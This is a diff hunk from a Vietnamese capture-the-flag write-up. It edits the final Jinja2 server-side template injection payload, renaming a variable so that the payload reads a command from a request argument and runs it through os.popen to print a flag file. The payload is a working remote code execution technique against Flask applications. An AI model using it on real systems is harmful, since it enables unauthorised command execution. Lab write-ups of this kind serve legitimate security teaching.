@@ -137,7 +137,7 @@ Ví dụ vị trí của method là 7 thì mình sẽ sử dụng:
 Payload cuối cùng:
 
 ```
-{%set a=url_for.__globals__.pop((url_for.__globals__|list).__getitem__(7)) %}{{url_for.__globals__.os.__dict__.popen(req.args.command).read()}}&command=cat /abc/flag.txt
+{%set req=url_for.__globals__.pop((url_for.__globals__|list).__getitem__(7)) %}{{url_for.__globals__.os.__dict__.popen(req.args.command).read()}}&command=cat /abc/flag.txt
 ```
 Với bài này theo mình nhớ thì flag không nằm trong thư mục hiện tại, chuỗi mình truyền vào trong command chỉ là một ví dụ, các bạn có thể truyền v
 các command thích hợp để tìm được vị trí của flag.
